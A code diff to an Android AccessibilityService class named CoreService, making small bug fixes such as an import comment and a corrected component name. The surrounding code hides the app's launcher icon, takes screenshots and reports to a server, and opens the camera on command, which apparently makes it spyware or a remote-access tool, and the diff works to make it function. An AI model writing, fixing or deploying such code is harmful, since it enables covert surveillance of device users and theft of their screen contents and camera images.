@@ -20,7 +20,7 @@ import android.os.SystemClock;
 import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
-import android.view.Display; // <-- IMPORT ADDED TO FIX ERROR
+import android.view.Display;
 import android.view.accessibility.AccessibilityEvent;
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
@@ -138,7 +138,7 @@ public class CoreService extends AccessibilityService {
 
     private void handleToggleIcon(boolean show) {
         PackageManager pm = getPackageManager();
-        ComponentName componentName = new ComponentName(this, ProvisioningActivity.class);
+        ComponentName componentName = new ComponentName(this, MainActivity.class); // CORRECTED
         int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
         pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
     }
@@ -181,7 +181,6 @@ public class CoreService extends AccessibilityService {
             submitDataToServer("screenshot_error", "Screenshot API not available on this Android version.");
             return;
         }
-        // --- THIS IS THE CORRECTED LINE ---
         takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
             @Override
             public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
@@ -207,7 +206,6 @@ public class CoreService extends AccessibilityService {
         try {
             if (cameraIdStr != null) cameraId = Integer.parseInt(cameraIdStr);
         } catch (NumberFormatException e) { Log.w(TAG, "Invalid camera ID, defaulting to 0."); }
-
         Intent intent = new Intent(this, CameraActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.putExtra("camera_id", cameraId);
